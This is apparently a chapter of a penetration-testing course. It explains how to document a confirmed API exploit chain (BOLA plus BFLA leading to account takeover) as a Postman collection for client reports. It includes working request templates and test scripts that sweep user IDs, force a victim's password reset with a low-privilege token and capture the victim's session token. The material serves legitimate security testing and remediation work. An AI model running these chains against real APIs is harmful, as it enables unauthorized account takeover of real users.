# API Security — Real-World Exploitation and Vulnerability Chaining
## Part 5: Postman Collection-Based Chain Documentation

Postman serves two distinct purposes in API chain work: it is a testing
tool during discovery (Part 3 already covered this use), and separately it
is a **PoC documentation tool** once a chain is confirmed — a way to package
a multi-step exploit into something a client's engineering team can
literally re-run, request by request, to reproduce the finding without
relying solely on prose description. This section covers the second use.

### Structuring a Collection as a Step-by-Step Exploit Chain

Build one Postman **collection per chain**, not one giant collection
covering every finding — this keeps each PoC self-contained and exportable
independently for its corresponding report finding.

**Naming and ordering convention:**

- Name the collection after the chain, matching the report finding title
  exactly (e.g., `Chain 1 - BOLA+BFLA to Account Takeover`).
- Name each request as `Step N: <what this step does and what it
  produces>` — for example: `Step 1: Enumerate victim user ID via BOLA`,
  `Step 2: Force password reset via BFLA endpoint`, `Step 3: Login with
  reset credentials (confirms takeover)`. A reviewer should be able to
  read the request names top-to-bottom in the collection sidebar alone and
  understand the full chain narrative before opening a single request body.
- Group multi-part steps (e.g., a step requiring both a metadata-role-name
  request and a metadata-credentials request, as in Chain 5) into a
  **folder** named for that step, containing the sub-requests in order,
  rather than flattening everything into one long top-level list.
- Add a **collection-level description** (Postman supports Markdown here)
  summarizing the chain in 3-5 sentences, referencing the finding ID from
  the report, so the collection is self-explanatory even if opened without
  the report alongside it.

### Using Test Scripts to Chain Requests Automatically

This is what elevates a Postman collection from "a list of related
requests" to "an actual reproducible exploit chain" — each step's **Tests**
tab (or **Post-response script**, in newer Postman versions) extracts the
value the next step needs and writes it to a collection or environment
variable, so Step 2 can reference `{{victim_user_id}}` without the operator
manually copy-pasting it out of Step 1's response.

**Worked example: Chain 1 (BOLA + BFLA → Account Takeover), broken down
line by line.**

*Step 1 request:* `GET {{base_url}}/api/v1/users/{{target_id}}/profile`
with `{{target_id}}` initially set to a low starting value (e.g. `2`) in
the environment, and `Authorization: Bearer {{role_a_token}}`.

*Step 1 Tests script:*

```javascript
// Line 1: Parse the response body as JSON so we can read individual fields
const body = pm.response.json();

// Line 2: Confirm the request succeeded before trusting the body —
// prevents the chain from silently continuing on a failed step
pm.test("Profile fetch succeeded", () => {
    pm.response.to.have.status(200);
});

// Line 3: Confirm this profile does NOT belong to the calling user
// (role_a_user_id was stored during login) — this is the actual BOLA
// assertion: proving cross-user data was returned
pm.test("BOLA confirmed - returned another user's profile", () => {
    pm.expect(body.id).to.not.eql(pm.environment.get("role_a_user_id"));
});

// Line 4: Store the victim's ID and email for use in Step 2's request
// body — this is the "output becomes input" hand-off described in
// Part 1 and Part 4
pm.environment.set("victim_user_id", body.id);
pm.environment.set("victim_email", body.email);

// Line 5: Auto-increment target_id so re-running the request (e.g. via
// Collection Runner) sweeps the ID space for enumeration demonstration
pm.environment.set("target_id", body.id + 1);
```

*Step 2 request:* `POST {{base_url}}/api/internal/admin/users/{{victim_user_id}}/force-password-reset`
with body `{"temp_password": "{{attacker_chosen_password}}"}` and
`Authorization: Bearer {{role_a_token}}` (deliberately the same
low-privilege token — this is what proves the BFLA, since Role A should
never be authorized to call this path at all).

*Step 2 Tests script:*

```javascript
// Line 1: This status check is itself the core assertion of the BFLA —
// a 200 here means a standard user's token was accepted by an
// admin-only function
pm.test("BFLA confirmed - low-privilege token accepted by admin endpoint", () => {
    pm.response.to.have.status(200);
});

// Line 2: Parse the response to confirm the reset was actually applied
// to the intended victim, not just that the call returned 200
const body = pm.response.json();
pm.test("Reset applied to correct victim account", () => {
    pm.expect(body.affected_user_id).to.eql(pm.environment.get("victim_user_id"));
});

// Line 3: Nothing further needs to be extracted here since the attacker
// supplied the new password directly in the request body (Link 2 in
// Chain 1's writeup) rather than the server generating and returning
// one — the chained value carried into Step 3 is simply
// attacker_chosen_password, already in the environment
```

*Step 3 request:* `POST {{base_url}}/api/v1/auth/login` with body
`{"email": "{{victim_email}}", "password": "{{attacker_chosen_password}}"}`.

*Step 3 Tests script:*

```javascript
// Line 1: A successful login response containing a valid access token
// is the final proof of full account takeover — the chain's
// cumulative impact made concrete and reproducible
const body = pm.response.json();

pm.test("Full account takeover confirmed - obtained victim's session token", () => {
    pm.response.to.have.status(200);
    pm.expect(body).to.have.property("access_token");
});

// Line 2: Store the stolen token so a reviewer can optionally add a
// Step 4 demonstrating an action taken as the victim (e.g. reading
// their private data) as further impact evidence
pm.environment.set("stolen_victim_token", body.access_token);

// Line 3: Log a clear console summary — visible in Postman's console
// (View → Show Postman Console) — so a reviewer running the collection
// sees an explicit plain-language confirmation, not just green
// checkmarks
console.log(`Chain complete. Took over account ${pm.environment.get("victim_email")} ` +
            `(user ID ${pm.environment.get("victim_user_id")}) starting from Role A's ` +
            `standard-user token alone.`);
```

This same pattern — extract in one step's script, reference via
`{{variable}}` in the next step's request, assert the chain's core claim
explicitly via `pm.test()` rather than only implicitly via a status code —
applies to every chain in Part 2. The specific fields extracted change
(a JWT instead of a user ID for Chain 2, a webhook-delivered metadata blob
for Chain 5) but the three-part pattern (extract → store → assert) does
not.

### Token Refresh Mid-Chain

For longer chains, or chains re-run during a Collection Runner sweep, an
access token obtained in Step 1 may expire before Step 5 executes. Handle
this with a **Pre-request Script** at the collection level (Collection →
Edit → Pre-request Script tab, applies to every request in the
collection) rather than repeating refresh logic per-request:

```javascript
// Line 1: Read the token's stored expiry timestamp, set during the
// original login step alongside access_token/refresh_token
const expiresAt = parseInt(pm.environment.get("token_expires_at") || "0");

// Line 2: Compare against current time with a 30-second safety margin,
// so a token that is *about* to expire mid-request is refreshed
// proactively rather than failing and requiring a manual re-run
if (Date.now() > (expiresAt - 30000)) {

    // Line 3: Issue a synchronous-style refresh call using Postman's
    // sendRequest, blocking this request's execution until the new
    // token is obtained
    pm.sendRequest({
        url: pm.environment.get("base_url") + "/api/v1/auth/refresh",
        method: "POST",
        header: { "Content-Type": "application/json" },
        body: {
            mode: "raw",
            raw: JSON.stringify({ refresh_token: pm.environment.get("role_a_refresh_token") })
        }
    }, (err, res) => {
        // Line 4: On success, overwrite the stale token and expiry
        // before the actual request fires
        if (!err && res.code === 200) {
            const data = res.json();
            pm.environment.set("role_a_token", data.access_token);
            pm.environment.set("token_expires_at", Date.now() + (data.expires_in * 1000));
        }
    });
}
```

### Exporting a Collection as PoC Evidence for Client Reports

1. **File → Export**, selecting **Collection v2.1 (recommended)** format —
   this is the widely-compatible format most client teams can import
   without version friction.
2. Export the **environment separately**, but with all live credential
   values (tokens, passwords used) either removed or replaced with clearly
   marked placeholders (`<<INSERT VALID ROLE_A TOKEN>>`) before
   attaching to a report — never ship a report attachment containing a
   still-valid credential for the client's production environment; provide
   credential values through a separate, appropriately secured channel if
   the client wants to personally re-run the collection against live
   infrastructure.
3. Attach both the collection JSON and the sanitized environment JSON as
   report appendix files, referenced explicitly in the finding write-up:
   "See attached `chain1-bola-bfla-takeover.postman_collection.json` for a
   fully reproducible PoC; import both files into Postman, select the
   provided environment, and run requests in order."
4. Also export a **Collection Runner summary** (Runner → Export Results)
   from an actual successful execution against the target and include a
   screenshot or the JSON results file — this proves the chain was
   actually executed and succeeded at the time of testing, which matters
   for engagements where remediation timelines are disputed later
   ("was this actually exploitable, or just theoretically constructed?").

### Testing Collection vs. PoC Documentation Collection — the Difference

These serve different audiences and should not be the same artifact:

| | Testing collection | PoC documentation collection |
|---|---|---|
| Audience | Yourself, mid-engagement | Client engineering/security team, post-engagement |
| Scope | Broad — every endpoint, every role combination, exploratory | Narrow — exactly the requests needed to reproduce one specific chain |
| Naming | Working names, may be inconsistent | Step-numbered, narrative-readable names (see above) |
| Scripts | May include verbose debug logging, half-finished assertions | Clean, minimal, each assertion directly supports a claim made in the report |
| Includes failed attempts | Often yes, kept for reference | No — only the working, minimal-reproduction path |
| Variables | May be hardcoded ad hoc during exploration | Fully parameterized via environment, ready for someone else to plug in their own test credentials |

**Practical workflow:** do exploratory testing in one broad working
collection (or directly in Repeater/Burp, per Part 3), and only once a
chain is confirmed, build a fresh, minimal PoC collection dedicated to that
chain — do not simply prune the working collection down, since it tends to
retain messy naming and leftover debug scripts that undermine the
professionalism of a report attachment.

### Real-World Notes

- Client engineering teams overwhelmingly prefer a working Postman
  collection over a purely prose-described reproduction path — it removes
  ambiguity about exact header casing, parameter names, and request
  ordering that prose descriptions frequently get subtly wrong when
  transcribed by hand from Burp history.
- Keep PoC collections under version control (a private git repo per
  engagement) alongside the report — this makes retesting after the client
  claims a fix is deployed trivial: re-run the same collection against the
  same environment variables (with fresh tokens) and confirm the chain now
  breaks at the remediated link.
- When a chain partially breaks on retest (e.g., Link 1 is fixed but Link 2
  still works in isolation), the PoC collection immediately shows exactly
  which numbered step now fails, which is far more useful to both parties
  than a general "this appears mostly fixed" statement in a retest report.

---
Next: `06_API_Specific_Report_Writing.md`
